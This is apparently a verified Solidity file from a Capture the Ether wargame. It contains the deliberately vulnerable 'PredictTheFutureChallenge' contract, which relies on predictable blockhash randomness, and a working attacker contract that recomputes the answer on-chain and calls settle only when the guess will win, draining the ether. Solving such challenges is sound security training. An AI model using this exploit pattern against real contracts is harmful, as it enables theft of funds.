/**
 *Submitted for verification at Etherscan.io on 2022-02-05
*/

pragma solidity 0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract test{
    uint8 public value;

    function()public payable{}

    event number(uint8 value_try);

    function setAttack(uint8 _value)public payable{
        PredictTheFutureChallenge target = PredictTheFutureChallenge(0x1490209625F82Ac26C63e8B91c359930f8C8Cb9D);
        value = _value;
        target.lockInGuess.value(msg.value)(value);
    }
    function attack()public{
        PredictTheFutureChallenge target = PredictTheFutureChallenge(0x1490209625F82Ac26C63e8B91c359930f8C8Cb9D);
        uint8 value_try = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        if(value_try == value){
            target.settle();
            msg.sender.transfer(address(this).balance);
        }
        emit number(value_try);
    }
}